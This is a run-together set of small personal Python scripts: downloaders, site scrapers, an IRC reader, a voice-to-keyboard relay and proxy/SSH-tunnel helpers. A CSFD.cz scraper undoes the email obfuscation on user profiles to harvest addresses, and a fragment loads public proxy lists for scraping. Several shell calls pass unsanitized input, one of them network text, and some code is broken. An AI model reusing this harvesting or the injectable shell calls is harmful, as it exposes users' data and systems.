import sys
import os.path
import argparse

from tqdm import tqdm


# Variables ===================================================================
BUFF_SIZE = 1024


# Functions & classes =========================================================
def diff_by_char(first_buff, second_buff):
    first_buff = list(first_buff)
    second_buff = list(second_buff)

    byte_count = 0
    while first_buff and second_buff:
        first_byte = first_buff.pop(0)
        second_byte = second_buff.pop(0)

        byte_count += 1

        if first_byte != second_byte:
            return byte_count

    return byte_count


def diff_after(first, second, filesize, buffer_size):
    correct = 0
    progress_bar = tqdm(total=filesize)

    while True:
        first_buff = first.read(buffer_size)
        second_buff = second.read(buffer_size)

        progress_bar.update(buffer_size)

        if not (first_buff and second_buff):
            if len(first_buff) == len(second_buff):
                return -1

            return correct + min([len(first_buff), len(second_buff)])

        if first_buff == second_buff:
            correct += buffer_size
            continue

        correct += diff_by_char(first_buff, second_buff)
        break

    return correct


def diff_files(first_fn, second_fn, buffer_size):
    size = min([os.path.getsize(first_fn), os.path.getsize(second_fn)])

    with open(first_fn, "rb") as first:
        with open(second_fn, "rb") as second:
            return diff_after(first, second, size, buffer_size=buffer_size)


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""Diff seeker - look into files and tell the position
            where they start to differ."""
        )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Be verbose."
    )
    parser.add_argument(
        "-b",
        "--buffer",
        default=BUFF_SIZE,
        type=int,
        help="Buffer size. Default {0}.".format(BUFF_SIZE)
    )
    parser.add_argument(
        "FIRST",
        help="First file."
    )
    parser.add_argument(
        "SECOND",
        help="Second file."
    )

    args = parser.parse_args()

    if not os.path.exists(args.FIRST):
        print("`{0}` not found!".format(args.FIRST), file=sys.stderr)
        sys.exit(1)

    if not os.path.exists(args.SECOND):
        print("`{0}` not found!".format(args.SECOND), file=sys.stderr)
        sys.exit(1)

    pos = diff_files(args.FIRST, args.SECOND, buffer_size=BUFF_SIZE)

    if pos == -1:
        if args.verbose:
            print("Files are same.")
        sys.exit()

    if args.verbose:
        print("Files differ at {0} byte.".format(pos))
    else:
        print(pos)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import argparse


# Variables ===================================================================
https://stackoverflow.com/questions/29930060/disable-cache-buffer-on-specific-file-linux
http://www.alexonlinux.com/direct-io-in-python


# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python3
import re
import sys
import os.path
from collections import namedtuple


class Record(namedtuple("Record", "nick time msg")):
    def __str__(self):
        return "%s <%s> %s" % (self.time, self.nick, self.msg)


def read_file(fn):
    if fn == "-":
        return sys.stdin.read()

    with open(fn) as f:
        return f.read()


def parse(data, first_poster=None, nick_translation={}):
    def is_time(s):
        return re.match("^\[\d{2}\:\d{2}\]", s)

    def is_nick_and_time(s):
        return re.match("^\S+\.\S+ \[\d{2}\:\d{2}\]", s)

    def parse_time(s):
        return s.split("]")[0].split("[")[-1]

    nick = first_poster
    time = None

    content = (x.strip() for x in data.splitlines() if x.strip())
    for line in content:
        if is_time(line):
            time = parse_time(line)
        elif is_nick_and_time(line):
            nick = line.split(" ")[0]
            time = parse_time(line.split(" ")[1])
        else:
            yield Record(
                nick=nick_translation.get(nick, nick),
                time=time,
                msg=line
            )


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "FILE",
        nargs=1,
        help="Name of the copied slack file."
    )
    parser.add_argument(
        "-f",
        "--first-poster",
        default=None,
        help="""Name of the first poster, if it isn't possible to guess it from
                the log."""
    )

    args = parser.parse_args()

    nicks = {
        "jaroslav.svoboda": "RemoteFox",
        "karel.gil": "fm4d"
    }

    slack_log = read_file(args.FILE[0])
    generator = parse(
        slack_log,
        first_poster=args.first_poster,
        nick_translation=nicks
    )

    print("\n".join(str(x) for x in generator))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#= Imports ====================================================================
from bottle import route, run, static_file


PNG_FN = '/how_tor_works_thumb.png'


@route(PNG_FN)
def picture():
    return static_file(PNG_FN, root=".")


@route("/")
@route("/<filename:re:.*>")
def allFns(filename=None):
    with open("tor-exit-notice.html") as f:
        return f.read()


#= Main program ===============================================================
if __name__ == '__main__':
    run(port=80, debug=False)
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import os.path
import urllib2



def processConf(s):
	"Remove #comments from string."
	s = map(lambda x: x.split("#")[0], s.splitlines())
	return filter(lambda x: x.strip() != "", s)

def createIfNotExists(path):
	if not os.path.exists(path):
		os.makedirs(path)



PORTAGE_FILE = "snapshots/portage-latest.tar.bz2"
PORTAGE_URL  = "http://distfiles.gentoo.org/" + PORTAGE_FILE
PORTAGE_LASTMOD_FILE = "lastmod.txt"

STAGE3_FILE = "http://distfiles.gentoo.org/releases/amd64/autobuilds/latest-stage3-amd64-hardened.txt"

# process stage3 file
filename = processConf(urllib2.urlopen(STAGE3_FILE).read())[0]
if not os.path.exists(filename):
	createIfNotExists(os.path.dirname(filename))

	fh = open(filename, "wb")

	hostname = os.path.dirname(STAGE3_FILE)
	response = urllib2.urlopen(hostname + "/" + filename)

	while True:
		block = response.read(4069 * 10)
		if len(block) == 0:
			break
		fh.write(block)
		fh.flush()

	fh.close()


# process portagefile
lastmod  = ""
if os.path.exists(PORTAGE_LASTMOD_FILE):
	fh = open(PORTAGE_LASTMOD_FILE)
	lastmod = fg.read()
	fh.close()

response = urllib2.urlopen(PORTAGE_URL)
response_headers = response.info().dict
server_lastmod = response_headers["last-modified"]

if server_lastmod != lastmod:
	createIfNotExists(os.path.dirname(PORTAGE_FILE))

	fh = open(PORTAGE_FILE, "wb")
	while True:
		block = response.read(4069 * 100)
		if len(block) == 0:
			break
		fh.write(block)
		fh.flush()
	fh.close()

	fh = open(PORTAGE_LASTMOD_FILE, "wt")
	fh.write(server_lastmod)
	fh.close()

#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import os
import os.path
import sys

from mfn import web as c
from mfn import IPtools


#= Variables ===================================================================



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"



#= Main program ================================================================
if __name__ == '__main__':
	# IPtools.installProxy("localhost", 2222)

	if os.path.exists(sys.argv[1]):
		links = open(sys.argv[1]).read().splitlines()
	else:
		links = [sys.argv[1]]

	for i in links:
		i = i.strip()

		if i == "":
			continue

		if os.path.exists(i + ".flv"):
			continue

		write("downloading " + i + " .. ")

		try:
			file = open(i + ".flv", "wb")
			file.write(c.getPage("http://  /media/videos/flv/" + i + ".flv"))
			file.close()

			writeln("done")
		except KeyboardInterrupt:
			os.system("rm " + i + ".flv")
			sys.exit(0)
		except:
			os.system("rm " + i + ".flv")
			write("fail, skipping")

#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import httpkie
import dhtmlparser as d



#= Variables ==================================================================
TRANSLATE = {
	"&#xE1;": "á",
	"&#xFD;": "ý",
	"&#xED;": "í",
	"&#xDA;": "Ú",
	"&#xFA;": "ú",
	"&#xE9;": "é",

}


#= Functions & objects ========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")



#= Main program ===============================================================
if __name__ == '__main__':
	down = httpkie.Downloader()
	data = down.download(
		"http://www.ceskaposta.cz/cz/nastroje/sledovani-zasilky.php?barcode=" + sys.argv[1] + "&locale=CZ&send.x=73&send.y=12&go=ok"
	).decode("iso-8859-2").encode("utf-8")
	# data = unicode(data, encoding="iso-8859-2")

	dom = d.parseString(data)
	lines = map(lambda x: x.getContent().strip(), dom.find("table")[0].find("td"))

	out = "\n".join(lines)

	for key, val in TRANSLATE.iteritems():
		out = out.replace(key, val)

	print out

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import irclib
import sys

#===============================================================================
# Variables ====================================================================
#===============================================================================
network = "monka.hysteria.cz"
#~ network = "madjack.2600.net"
port 	= 6667
channel = "#shadowfall"
nick 	= "irc2espeak"

#===============================================================================
#= Functions & objects =========================================================
#===============================================================================

def printMsg ( connection, event ):
   sys.stdout.write(event.source().split("!")[0] + ': ' + event.arguments()[0] + "\n")
   sys.stdout.flush()

#===============================================================================
#= Main program ================================================================
#===============================================================================
irc = irclib.IRC()

bot = irc.server()
bot = bot.connect(network, port, nick)
bot.join(channel)

irc.add_global_handler("pubmsg", printMsg)

irc.process_forever()





#! /usr/bin/env python3
import sys

if __name__ == '__main__':
    with open(sys.argv[1]) as f:
        try:
            data = f.read()
        except UnicodeDecodeError as e:
            print(sys.argv[1])
            sys.exit(1)

    for lineno, line in enumerate(data.splitlines()):
        for i in line:
            if ord(i) >= 127:
                print(sys.argv[1], "line", lineno + 1)#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os


# Variables ===================================================================
for cnt, fn in enumerate(sorted(os.listdir("."))):
    if not fn.endswith(".jpeg"):
        continue

    os.system("jpegtran -rotate 270 %s > %03d.jpg" % (fn, cnt))#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Created: 27.09.13
#
# Imports =====================================================================
import ast
import types  # NoneType
import pprint


# Variables ===================================================================
BASIC_TYPES = [bool, int, float, long, complex, basestring]
SEQ_TYPES = [tuple, dict, list, set]


# Functions & objects =========================================================
def validate(data):
    if type(data) in BASIC_TYPES or isinstance(data, types.NoneType):
        return

    if type(data) in SEQ_TYPES:
        if isinstance(data, set):
            for key, val in data.iteritems():
                validate(key)
                validate(val)
        else:
            for item in data:
                validate(item)
    else:
        raise TypeError(str(type(data)) + " is not supported!")


def save(data):
    validate(data)

    pp = pprint.PrettyPrinter()
    return pp.pformat(data)


def load(data):
    return ast.literal_eval(data)
#! /usr/bin/env python3
import os
import os.path

import tqdm
import dhtmlparser


all_text = ""
for root, dirs, files in os.walk("."):
    for file in tqdm.tqdm(files):
        path = os.path.join(root, file)

        if not path.endswith(".html"):
            continue

        with open(path) as f:
            data = f.read()

        dom = dhtmlparser.parseString(data)
        body = dom.find("body")[0]


        all_text += body.getContent()


print(len(all_text))
print(len(all_text) / 1024.0 / 1024)#!/usr/bin/env python
# -*- coding: utf-8 -*-
__version = "0.5.1"
__date    = "21.06.2013"
# KusabaAPI by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime Text 2 editor.
#= Imports =====================================================================
from mfn import html, web



#= Functions & objects =========================================================
class Post:
	def __init__(self, author = None, email = None, subject = "", text = "", post_id = None, files = []):
		self.author      = author
		self.email       = email
		self.subject     = subject
		self.text        = text
		self.time        = ""

		self.post_id     = post_id
		self.files       = files # array of dictionaries; {file:url, thumb:url}

	def __str__(self):
		return str(
			"Author:  " + str(self.author) + "\n" +
			"Email:   " + str(self.email) + "\n" +
			"ID:      " + str(self.post_id) + "\n" +
			"Time:    " + self.time + "\n" +
			"Subject: " + self.subject + "\n" +
			"Files:   " + str(self.files) + "\n" +
			"Text:    " + self.text + "\n\n"
		) 



class Thread:
	def __init__(self, chan_url, thread_url):
		self.chan_url = chan_url
		self.thread_url = thread_url
		self.url = chan_url + thread_url

		self.ops_name  = None
		self.thread_id = int(thread_url.split(".")[0].split("/")[-1])
		self.first_message = None

	def __str__(self):
		return str(
			"ID: " + str(self.thread_id) + "\n" +
			"OPs name: " + self.ops_name + "\n" +
			"Message:" + self.first_message + "\n\n"
		)

	def getPosts(self):
		"Returns all Post objects from thread."

		dom = html.parseString(web.getPage(self.url))

		posts = []
		for p in dom.find("div", {"class" : "post"}):
			post = Post()

			# parse poster's name / email
			post.author = p.find("span", {"class" : "postername"})[0]
			if len(post.author.find("a")) > 0:
				post.author = post.author.find("a")[0]
				post.email  = post.author.params["href"].replace("mailto:", "")
			post.author = post.author.getContent()

			# subject
			subject = p.find("span", {"class" : "subject"})
			if len(subject) > 0:
				post.subject = subject[0].getContent()

			# attachment
			post.files = [] # dont ask, this is some weird memory - alocating shit issue
			attachment = p.find("p", {"class" : "file_size"})
			if len(attachment) > 0:
				attachment = attachment[0].find("a")
				thumb = p.find("img", {"class" : "thumb"})
				thumb = thumb[0].params["src"] if len(thumb) > 0 else ""


				if len(attachment) > 0:
					post.files.append({
							"file" : attachment[0].params["href"],
							"thumb" : thumb
						}
					)


			#attachments - yeah, multiattachment posts, lovely
			# attachments = []
			attachments = p.find("span", {"class" : "multithumbfirst"})
			attachments.extend(p.find("span", {"class" : "multithumb"}))

			thumbs = p.find("img", {"class" : "multithumbfirst"})
			thumbs.extend(p.find("img", {"class" : "multithumb"}))
			thumbs = map(lambda x: x.params["src"], thumbs)

			tmp_files = []
			for attachment in attachments:
				attachment = attachment.find("a")

				if len(attachment) > 0:
					tmp_files.append(attachment[0].params["href"])
			for f, t in zip(tmp_files, thumbs):
				post.files.append({"file" : f, "thumb" : t})


			# time
			time = p.find("div", {"class" : "post_header"})[0]
			time = filter(lambda x: not x.isTag() and str(x).strip() != "", time.childs)
			post.time = str(time[0]).strip()

			post.text = p.find("p", {"class" : "message"})[0].getContent()
			post.post_id = p.params["id"]

			posts.append(post)

		return posts



class Kusaba:
	def __init__(self, url):
		self.url = url

	def getBoardList(self):
		"Returns boardlist as dictionary board:url_short."
		dom = html.parseString(web.getPage(self.url + "/menu.php"))

		# all /links/
		board_list = {}
		for link in dom.find("a"):
			if "href" in link.params and "class" in link.params:
				href = link.params["href"]

				# extract short url
				if href.lower().startswith("http"):
					href = href[:-1] if href.endswith("/") else href
					href = "/" + href.split("/")[-1] + "/"

				if href.startswith("/") and href.endswith("/"):
					board_list[link.getContent().strip()] = href

		return board_list

	def getThreadList(self, board_url):
		"Returns list of all threads (Thread object) in given board."

		dom = html.parseString(web.getPage(self.url + board_url))

		# parse how many pages is in thread
		paging = dom.find("div", {"id" : "paging"})
		if len(paging) != 0:
			paging = paging[0].find("a")[-1].getContent()
			paging = int(paging)
		else:
			paging = 0

		threads = []
		for p in range(paging + 1):
			url = self.url + board_url if p == 0 else self.url + board_url + str(p) + ".html"
			dom = html.parseString(web.getPage(url))

			for t in dom.find("div", {"class" : "thread"}):
				thread_url = t.find("span", {"class" : "reflink"})[0].find("a")[0].params["href"].split("#")[0]

				# really really big thread tends to have different syntax of link
				if "read.php" in thread_url:
					board_part  = ""
					thread_part = ""
					for i in thread_url.replace("&amp;", "&").replace("?", "&").split("&"):
						if "b=" in i:
							board_part  = i.split("=")[-1]
						if "t=" in i:
							thread_part = i.split("=")[-1]
					thread_url = "/" + board_part + "/res/" + thread_part + ".html"

				thread = Thread(self.url, thread_url)
				thread.first_message = t.find("p", {"class" : "message"})[0].getContent()

				# parse op's name
				thread.ops_name = t.find("span", {"class" : "postername"})[0]
				n = thread.ops_name.find("a")
				thread.ops_name = n[0].getContent() if len(n) > 0 else thread.ops_name.getContent()

				threads.append(thread)

		return threads



#= Main program ================================================================
if __name__ == '__main__':
	print "Kusaba API v" + __version + " (" + __date + ") by Bystroushaak (bystrousak@kitakitsune.org)"
	k = Kusaba("http://7chan.org")
	print "\n\n".join(map(lambda x: str(x), k.getThreadList("/pr/")[0].getPosts()))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in gedit text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys

try:
	import mfn
except ImportError:
	sys.stderr.write("\nThis module require mfn module/package.\n")
	sys.stderr.write("You can get it from -.\n\n")
	sys.exit(1)



#= Variables ===================================================================
URL = "http://digichan.cz"



#= Functions & objects =========================================================
def getCategories():
	"Return list of categories (dictionary with kewords cat_url, name, descr)."

	# download and parse categories
	data = mfn.web.getPage(URL)
	dom  = mfn.html.parseString(data)

	# all divs without parameters from <div class="sections">
	cat = filter(lambda x: len(x.params) == 0, dom.find("div", {"class":"sections"})[0].find("div"))

	out = []
	for i in cat:
		a = i.find("a")
		a = a[0] if len(a) > 0 else None

		span = i.find("span")
		span = span[0] if len(span) > 0 else None

		if a == None or span == None:
			continue

		out.append({
			"cat_url"   : a.params["href"], 
			"descr" : span.getContent(), 
			"name"  : a.getContent()
		})

	return out


def getThreads(cat_url):
	data = mfn.web.getPage(URL + cat_url)
	dom  = mfn.html.parseString(data)

	# <article class="thread-preview" id="thread-111">
	threads = []
	for thread in dom.find("article", {"class":"thread-preview"}):
		thread_id = thread.params["id"]

		threads.append({
			"thread_id" : thread_id.split("-")[1]
		})
	
	return threads


# def getPosts(cat_url, thread_id):


# def postThread(cat_url, content):

# def postPost(cat_url, thread_id, content):




#= Main program ================================================================


print getThreads("/digi/")



if __name__ == '__main__':
	print "Digichan.cz interface"
	sys.exit(0)




#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import os
import sys
import time
import select
import socket


BS = "\x08"
ESC = "\x1b"


def _make_connection(server, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server, port))

    return client


def _verbose_wrapper_make_connection(server, port):
    """
    Try to make connection to given server:port. If the connection can't be
    established, wait and try again after one second.
    """
    while True:
        try:
            conn = _make_connection(server, port)
            print "Connected"
            return conn
        except socket.error:
            sys.stderr.write("Can't connect to %s:%d " % (server, port))
            sys.stderr.write("Waiting 1s..\n")
            time.sleep(1)


def read_from(server, port):
    readers = []

    def reset_connection():
        while readers:
            readers.pop()

        readers.append(_verbose_wrapper_make_connection(server, port))

    reset_connection()

    last_time = 0
    while True:
        read_ready, _, errors = select.select(readers, [], [], 5)

        if errors:
            for error in errors:
                error.close()

            reset_connection()
            continue

        if time.time() - last_time < 0.5:
            continue

        for s in read_ready:
            try:
                data = s.recv(1024)
            except socket.error:
                yield ESC
                reset_connection()
                break

            if data:
                yield data
            else:
                yield ESC
                # restart connection
                reset_connection()

        last_time = time.time()


class TextProcessor(object):
    def __init__(self):
        self.sent = ""

    def reset(self):
        self.sent = ""

    def send(self, data):
        data = data.encode("utf-8")
        lines = data.split("\n")

        if len(lines) == 1:
            print "send>%s" % data
            os.system("xdotool type '{}'".format(data))
            return

        head = lines[:-1]
        tail = lines[-1]

        for line in head:
            print "send>%s\\n" % data
            os.system("xdotool type '{}'".format(line))
            os.system("xdotool key Return")

        os.system("xdotool type '{}'".format(tail))

    def backspace(self):
        os.system("xdotool key BackSpace")
        print "send>backspace"

    def _no_bs_at_start(self, line):
        cnt = 0
        for i in line:
            if i == BS:
                cnt += 1
            else:
                break

        return cnt

    def process_text(self, data):
        data = data.strip()

        if not data:
            return

        if not data.replace(BS, "").strip():
            return

        # new line
        if ESC in data:
            self.reset()
            return

        bs_cnt = self._no_bs_at_start(data)

        buffer = [x for x in data[bs_cnt:].split(BS) if x.strip()][-1]

        # because of the only delta of the sentence is sent, I want to work
        # with unicode to prevent splitting UTF-8 sequences
        buffer = buffer.decode("utf-8", "ignore")

        buffer = buffer.replace(" enter ", "\n")
        buffer = buffer.replace(" Enter ", "\n")
        # buffer = buffer.replace("enter ", "\n")
        # buffer = buffer.replace("Enter ", "\n")
        buffer = buffer.replace("enter", "\n")
        buffer = buffer.replace("Enter", "\n")

        buffer = buffer.replace(BS, "[BS]")

        print
        print ">s>%s<<<" % buffer

        self.send_diff(buffer)

    def _index_where_differ(self, a, b):
        """
        Just simple comparator to see the index where the a and b are
        different.
        """
        if not a:
            return 0

        if not b:
            return 0

        for i in range(len(a)):
            if i >= len(b):
                return i

            if a[i] != b[i]:
                return i

        return len(a)

    def send_diff(self, buffer):
        if not self.sent:
            self.send(buffer)
            self.sent = buffer
            return

        # apple's voice recognition tends to correct sentences as you type
        # this tries to compare the sentence with the already sent data, to
        # see what was chenged and then send only difference of the change
        diff_index = self._index_where_differ(self.sent, buffer)

        # do not go more than 5 characters to the past (using backspace)
        if len(self.sent) - diff_index > 5:
            diff_index = len(self.sent) - 5

        def nothing_changed(diff_index):
            return self.sent == buffer or diff_index == len(self.sent)

        # if nothing_changed(diff_index):
        #     # if len(buffer) > diff_index:
        #     new = buffer[diff_index:]
        #     self.send(new)
        #     self.sent += new
        # else:
        tail = self.sent[diff_index:]
        self.sent = self.sent[:diff_index]

        for _ in tail:
            self.backspace()

        new = buffer[diff_index:]
        self.send(new)
        self.sent += new


if __name__ == '__main__':
    text_processor = TextProcessor()
    for chunk in read_from(sys.argv[1], int(sys.argv[2])):
        text_processor.process_text(chunk)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
CSFD.cz API by Bystroushaak (bystrousak@kitakitsune.org)
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import time
import urllib2
import httplib


import httpkie
import dhtmlparser

from binarysearch import binarySearch



#= Variables ==================================================================
BASE_URL = "http://www.csfd.cz/"
USER_URL = BASE_URL + "uzivatel/"
RATING_URL_SUFFIX = "/hodnoceni"





#= Functions & objects ========================================================
def _download(url, countdown = 5):
	time.sleep(5)
	try:
		return httpkie.Downloader().download(url)
	except (urllib2.URLError, httplib.IncompleteRead):
		if countdown == 0:
			raise
		return _download(url, countdown - 1)


def _getRatingUrl(uid):
	return USER_URL + str(uid) + RATING_URL_SUFFIX


def findNumberOfUsers():
	"""
	Return how much users (=last registered user ID) is currently registered
	on CSFD.
	"""
	def testUser(uid):
		try:
			return len(_download(_getRatingUrl(uid))) > 0
		except urllib2.HTTPError:
			pass

		return False

	return binarySearch(1, 10000000, testUser)


class User:
	def __init__(self, uid):
		self.uid      = uid
		self.username = ""
		self.realname = ""
		self.email    = ""
		self.ratings  = []
		self.updated  = 0


	def __findHowMuchPages(self, dom):
		paginator = dom.find("div", {"class": "paginator text"})

		if len(paginator) == 0:
			return 1

		paginator = paginator[0]
		links = paginator.find("a")

		if len(links) > 1:
			return int(links[-2].getContent())

		return 1


	def __findUsernameRealnameEmail(self, dom):
		info = dom.find("div", {"class": "info"})

		if len(info) >= 1:
			info = info[0]

			username = info.find("h2")
			if len(username) >= 1:
				self.username = username[0].getContent().strip()

			realname = info.find("h3")
			if len(realname) >= 1:
				self.realname = realname[0].getContent().strip()

		# parse email
		email = dom.find("span", {"class": "email"})

		if len(email) >= 1:
			email = email[0].getContent()
			email = email.split(": ")[1].split()
			email[0] = email[0][::-1]  # reverse first item
			email = "".join(email)

			self.email = email.replace("(a)", "@")


	def parseData(self):
		"""
		Set internal variables to data from user profile.
		"""
		self.url = _getRatingUrl(self.uid)
		dom = dhtmlparser.parseString(_download(self.url))

		self.__findUsernameRealnameEmail(dom)

		ratings = []
		for i in range(self.__findHowMuchPages(dom)):
			i = i + 1  # page indexes starts from 1

			# skip first page - it is already downloaded
			if i > 1:
				dom = dhtmlparser.parseString(
					_download(self.url + "/strana-" + str(i) + "/")
				)

			rating_table = dom.find("table", {"class": "ui-table-list"})

			# skip pages without rating tables
			if len(rating_table) == 0:
				continue
			rating_table = rating_table[0]

			for tr in rating_table.find("tr"):
				tds = tr.find("td")

				# skip blank rows
				if len(tds) == 0:
					continue

				# parse name and title
				name, url = "", ""
				__ = tds[0].find("a")
				if len(__) >= 1:
					name = __[0].getContent().strip()
					url  = __[0].params["href"] if "href" in __[0].params else ""
				movie = {"name": name, "url": url}

				# parse rating
				odpad = tds[1].find("strong", {"class": "rating"})
				img = tds[1].find("img")
				if len(odpad) >= 1:
					rating = 0
				elif len(img) >= 1:
					img = img[0]
					rating = len(img.params["alt"]) if "alt" in img.params else None
				else:
					rating = None
				movie["rating"] = rating

				ratings.append(movie)

		self.ratings = ratings
		self.updated = int(time.time())



#= Main program ===============================================================
if __name__ == '__main__':
	print "Testing.."
	assert(findNumberOfUsers() >= 444526)  # number of users 12.10.2013

	u = User(110763)
	u.parseData()
	assert(len(u.ratings) >= 390)

	print "All test passed"
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from IPtools import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module to ease usage of SOCK5 proxy and SSH tunnel installation.

There is also functions for checking your IP.

Examples:
--
>>> import IPtools
>>> IPtools.getIP()
'429.292.637.2'  # modified to protect my privacy
--

SSH proxy:
--
>>> port = IPtools.sshTunnel("bystrousak@kitakitsune.org", "###")
>>> IPtools.installProxy("localhost", port)
>>> IPtools.getIP()
'31.31.73.113'
--

Restoring original socket:
--
>>> import IPtools
>>> IPtools.getIP()
'429.292.637.2'
>>> IPtools.installProxy("localhost", IPtools.sshTunnel("bystrousak@kitakitsune.org", "###"))
>>> IPtools.getIP()
'31.31.73.113'
>>> IPtools.restoreSocket()
>>> IPtools.getIP()
'429.292.637.2'
>>>
--

Author: Bystroushaak (bystrousak@kitakitsune.org)
"""
#
# Imports #####################################################################
import sys
import copy
import socket
import random
import urllib2


try:
	import pexpect
except ImportError, e:
	sys.stderr.write(
		"I do require pexpect module. You can get it from\n"
		"http://sourceforge.net/projects/pexpect/ OR from 'python-pexpect' ubuntu"
		"package OR from PIP (pexpect)\n"
	)
	raise


try:
	import socks
except ImportError, e:
	sys.stderr.write(
		"I do require sock module. You can get it from\n"
		"http://socksipy.sourceforge.net/ OR from PIP (SocksiPy)\n"
	)
	raise


from timeout import timeout



# Vars ########################################################################
__IP         = ["", ""]
TIMEOUT      = 10.0
ORIG_SOCK    = None
EXPECT_CLASS = []  # this is necessary due to garbage collector



# Functions & objects #########################################################
class ProxyException(Exception):
	def __init__(self, msg):
		self.msg = msg

	def __str__(self):
		return repr(self.msg)



@timeout(
	int(TIMEOUT / 2),
	None,
	"This proxy is slower than your " + str(TIMEOUT) + "s .TIMEOUT property!"
)
def __getPage(url):
	f = urllib2.urlopen(url)
	data = f.read()
	f.close()

	return data


def getIP():
	"Return current IP address."

	data = __getPage("http://www.whatsmyip.us/showipsimple.php")
	return data.replace('document.write("', "").replace('");', "").strip()


@timeout(int(TIMEOUT), None)
def installProxy(SOCK_ADDR, SOCK_PORT, check_ip = True):
	"""
	Install SOCKS5 proxy.

	Raise ProxyTimeoutException
	"""

	# get normal ip
	if check_ip:
		try:
			__IP[0] = getIP()
		except Exception, e:
			raise ProxyException("Can't connect to internet!\n" + str(e))

	# save original socket
	global ORIG_SOCK
	ORIG_SOCK = copy.copy(socket.socket)

	# apply proxy
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCK_ADDR, SOCK_PORT)
	socket.socket = socks.socksocket

	# get ip over proxy
	if check_ip:
		try:
			__IP[1] = getIP()
		except Exception, e:
			raise ProxyException(
				"Your SOCK5 proxy (" + SOCK_ADDR + ":" + str(SOCK_PORT) + ") "
				"isn't responding!\n" +
				str(e)
			)

		if __IP[0] == __IP[1]:
			raise ProxyException("This proxy doesn't hides your IP, use better one")


def sshTunnel(login_serv, e, port = None, timeout = TIMEOUT):
	"""
	Create (but don't use -> see installProxy()) SOCKS5 tunnel over SSH.

	Example:
	---
	import IPtools

	print IPtools.getIP() # -> your IP

	IPtools.installProxy(
		"localhost",
		IPtools.sshTunnel("ssh@somewhere.com", timeout = 30)
	)

	print IPtools.getIP() # -> tunnel's IP
	---

	Return port where the tunnel is listenning.
	"""

	if port is None:
		port = random.randint(1025, 65534)

	# create ssh tunnel
	c = pexpect.spawn("ssh -D " + str(port) + " " + login_serv)
	tmp = c.expect([e, "yes/no"], timeout = timeout)

	# ssh key authorization
	if tmp == 1:
		c.sendline("yes")
		c.expect(e, timeout = timeout)

	EXPECT_CLASS.append(c)  # dont let garbage collector delete this

	return port


def restoreSocket():
	"""Removes proxy from your system and restores original socket."""
	global ORIG_SOCK
	socket.socket = ORIG_SOCK
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import socket
import urllib2
import httplib
import argparse

from pymongo import MongoClient

import httpkie
import dhtmlparser
import IPtools

import csfd
# import httpproxy.ipaddresscom as ipaddresscom
import httpproxy.hidemyass as hidemyass



#= Variables ==================================================================
proxy_list = []



#= Functions & objects ========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
